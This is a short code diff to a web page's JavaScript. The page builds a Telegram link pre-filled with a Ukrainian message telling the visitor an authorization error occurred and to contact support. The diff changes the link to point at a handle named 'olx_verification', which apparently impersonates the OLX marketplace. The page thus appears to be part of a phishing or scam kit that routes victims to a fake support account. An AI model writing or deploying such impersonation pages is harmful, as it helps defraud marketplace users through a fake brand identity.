@@ -67,7 +67,7 @@ const params = new URLSearchParams(window.location.search);
 const code = params.get("code");
 
 // Ссылка на Telegram с предзаполненным текстом
-const telegramUrl = "https://t.me/share/url?url=&text=" + encodeURIComponent(
+const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encodeURIComponent(
     "Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації»"
 );
 
@@ -116,3 +116,4 @@ if (code) {
 
 </body>
 </html>
+
